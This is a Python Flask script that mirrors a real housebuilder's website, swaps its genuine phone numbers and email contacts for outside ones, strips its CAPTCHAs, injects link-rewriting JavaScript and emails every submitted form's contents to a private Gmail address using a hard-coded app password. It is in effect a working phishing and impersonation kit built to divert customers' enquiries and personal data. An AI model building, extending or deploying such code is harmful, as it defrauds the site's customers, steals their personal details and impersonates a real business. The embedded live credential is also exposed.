from flask import Flask, render_template_string, request, redirect, jsonify, Response
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import re

app = Flask(__name__)

base_url = "https://www.hill.co.uk/"
your_email = "shacamsserver@gmail.com"
smtp_password = "xrty tvld aghh iict"  # Use a secure method to store passwords

phone_numbers_to_remove = [
    "020 3959 0900", "02039061952", "0208 501 8777", "01223869139", "01799 610831", "01799 619 305",
    "01376310768", "01223 643409", "01438 902540", "0143 906417", "01603 882420", "01923 920442",
    "01485 500513", "01865 411680", "01502440525", "01580 231556", "01865 950199", "01638 599099"
]

# Route for the main page
@app.route('/')
def home():
    return fetch_page(base_url)

# Route to fetch content from any page on the external site
@app.route('/fetch')
def fetch():
    relative_url = request.args.get('url', '')
    if not relative_url:
        return redirect('/')  # Redirect to home if no URL is provided

    full_url = urljoin(base_url, relative_url)

    # Prevent fetching non-internal URLs to avoid potential security issues
    if not is_internal_url(full_url):
        return redirect('/')  # Redirect to home if the URL is external

    return fetch_page(full_url)


@app.route('/', methods=['POST'])
def handle_form_submission():
    # Extract all form data
    form_data = request.form

    # Prepare data to be used in the modified URL
    location = form_data.get('location', '')
    min_bedrooms = form_data.get('minBedrooms', '')
    max_bedrooms = form_data.get('maxBedrooms', '')
    min_price = form_data.get('minPrice', '')
    max_price = form_data.get('maxPrice', '')
    radius = form_data.get('radius', '')

    # Construct the modified URL for the external site
    base_url = "http://127.0.0.1:5000/fetch?url=https://www.hill.co.uk/all-developments"
    modified_url = (
        f"{base_url}?location={location}&minBedrooms={min_bedrooms}"
        f"&maxBedrooms={max_bedrooms}&minPrice={min_price}"
        f"&maxPrice={max_price}&radius={radius}"
    )

    # Redirect the user to the modified URL
    return redirect(modified_url)

# Handle form submission dynamically for all routes
@app.route('/', defaults={'path': ''}, methods=['POST'])
@app.route('/<path:path>', methods=['POST'])
def handle_all_routes(path):
    if request.args.get('ajax_form') == '1' and request.args.get('_wrapper_format') == 'drupal_ajax':
        try:
            # Extract form data
            form_data = request.form
            subject = "Form Submission"
            body = "\n".join([f"{key}: {value}" for key, value in form_data.items()])

            # Send email (implement this function as per your setup)
            send_email(subject, body)

            # Return success response
            return jsonify(message="Form submitted successfully!"), 200
        except Exception as e:
            return jsonify(error=str(e)), 500  # Return server error for exceptions

    # Return an error if the request is invalid
    return jsonify(error="Invalid request"), 400

# Helper function to send email
def send_email(subject, body):
    sender_email = "shacamsserver@gmail.com"
    receiver_email = "daliresamuel@gmail.com"
    password = smtp_password

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Connect to Gmail's SMTP server
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender_email, password)
        server.send_message(msg)
        
        
# Helper function to fetch and parse the page content
def fetch_page(full_url):

    response = requests.get(full_url)
    
    # Check for response status and handle errors
    if response.status_code != 200:
        return "Error fetching page", 500

    soup = BeautifulSoup(response.content, "html.parser")

    # Remove the phone numbers from text content
    for phone_number in phone_numbers_to_remove:
        remove_phone_number(soup, phone_number)    

    # Update relative URLs for CSS, JS, and images to absolute URLs
    for link in soup.find_all("link", href=True):
        link['href'] = urljoin(base_url, link['href'])
    for script in soup.find_all("script", src=True):
        script['src'] = urljoin(base_url, script['src'])
    for img in soup.find_all("img", src=True):
        img['src'] = urljoin(base_url, img['src'])
    for a in soup.find_all("a", href=True):
        a['href'] = urljoin(base_url, a['href'])

        # General modification for other links
        a['onclick'] = f"window.location.href='/fetch?url={a['href']}'"
        a['href'] = '#'


    #Find and remove unwanted contact sections
    contact_sections = soup.find_all(string=["Sales", "Customer Service", "Supply Chain", 
                                                 "Resident Liaison Team", "Land & Development", 
                                                 "Recruitment", "Media Enquiries", "0808 178 6500",
                                                 "0800 032 6760", "020 8527 1400", "020 3959 0900"])
    
    for section in contact_sections:
            parent_element = section.find_parent()
            if parent_element:
                parent_element.decompose()

        # Find and update the General Enquiries phone number 020 8394 2821
    for elem in soup.find_all(string="020 8394 2821"):
            if elem:
                elem.replace_with("044 7376 373421")  # Replace phone number

    # Inject JavaScript to modify search result links dynamically
    script_tag = soup.new_tag('script')
    script_tag.string = """
        document.addEventListener('DOMContentLoaded', function() {
            function modifyLinks() {
                // List of path patterns to modify
                const paths = [
                    '/all-developments/',
                    '/all-developments?location=',
                    '/hollymead-square',
                    '/audley-green',
                    '/chesterford-meadows',
                    '/eden-green',
                    '/cambridgeshire',
                    '/farehurst-park',
                    '/marleigh',
                    '/hertfordshire',
                    '/nexus',
                    '/cambium-square',
                    '/rayners-green',
                    '/london',
                    '/millside-grange',
                    '/west-london',
                    '/the-gables',
                    '/canalside-quarter',
                    '/st-james-quay',
                    '/heartwood',
                    '/hartley-acres',
                    '/st-georges-place',
                    '/elgrove-gardens'
                ];

                paths.forEach(function(path) {
                    document.querySelectorAll(`a[href*="${path}"]`).forEach(function(a) {
                        var externalUrl = 'https://www.hill.co.uk' + a.getAttribute('href');
                        a.setAttribute('href', '#');
                        a.setAttribute('onclick', `window.location.href='/fetch?url=${encodeURIComponent(externalUrl)}'`);
                    });
                });
            }

            // Call the function to modify links
            modifyLinks();

            // MutationObserver to handle dynamically loaded content
            var observer = new MutationObserver(function(mutationsList) {
                modifyLinks();
            });
            observer.observe(document.body, { childList: true, subtree: true });
        });
    """
    soup.body.append(script_tag)

    # Remove or disable CAPTCHA elements
    captcha_iframes = soup.find_all("iframe", src=True)
    for iframe in captcha_iframes:
            if "captcha" in iframe['src']:
                iframe.decompose()

    captcha_divs = soup.find_all("div", class_="captcha")
    for div in captcha_divs:
            div.decompose()

    captcha_scripts = soup.find_all("script", src=True)
    for script in captcha_scripts:
            if "captcha" in script['src']:
                script.decompose()
    # Return the cleaned HTML content
    return render_template_string(soup.prettify())

def remove_phone_number(soup, phone_number):
    # Remove phone number from text content
    for text_element in soup.find_all(string=True):
        if phone_number in text_element:
            new_text = text_element.replace(phone_number, "044 7376 373421")
            text_element.replace_with(new_text)

# Function to replace specific email addresses in HTML content
def replace_emails(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')

    # Replacement email address
    replacement_email = 'info@xeltranstrategics.co.uk'

    # Replace text and attributes in <a> tags
    for tag in soup.find_all('a'):  # Find all <a> tags
        # Replace the text within the <a> tag if it matches an email pattern
        if tag.string and re.search(r'\b\w+@\w+\.\w+\b', tag.string):
            tag.string = replacement_email
        
        # Check and replace href attribute if it contains email obfuscation
        if tag.has_attr('href') and 'cdn-cgi/l/email-protection' in tag['href']:
            tag['href'] = f'mailto:{replacement_email}'
        
        # Check and replace onclick attribute if it contains email obfuscation
        if tag.has_attr('onclick') and 'cdn-cgi/l/email-protection' in tag['onclick']:
            tag['onclick'] = f"window.location.href='mailto:{replacement_email}'"

    return str(soup)

# Middleware to modify the response and replace emails
@app.after_request
def modify_response(response: Response) -> Response:
    # Only modify the response if it's HTML
    if 'text/html' in response.content_type:
        response_data = response.get_data(as_text=True)
        # Replace emails in the response content
        modified_html = replace_emails(response_data)
        # Update the response with modified HTML content
        response.set_data(modified_html)
    
    return response

# Function to determine if the URL is internal
def is_internal_url(url):
    return urlparse(url).netloc == urlparse(base_url).netloc

if __name__ == '__main__':
    app.run(debug=True)